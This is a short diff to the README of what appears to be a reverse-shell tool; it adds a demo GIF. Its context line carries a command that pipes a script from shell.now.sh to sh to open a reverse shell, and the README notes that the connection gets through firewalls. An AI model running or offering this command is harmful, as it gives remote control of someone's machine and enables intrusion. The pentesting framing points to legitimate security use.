@@ -29,6 +29,10 @@ curl https://shell.now.sh/192.168.0.69:1337 | sh
 
 This is meant to be used for pentesting or helping coworkers understand why they should always lock their computers. Please don't use this for anything malicious.
 
+## Demo
+
+<img src="https://i.imgur.com/qEZBDq5.gif" width="1082">
+
 ## Tip
 
 You can use a hostname or an IP. Because this is a reverse connection it can punch through firewalls and connect to the internet.
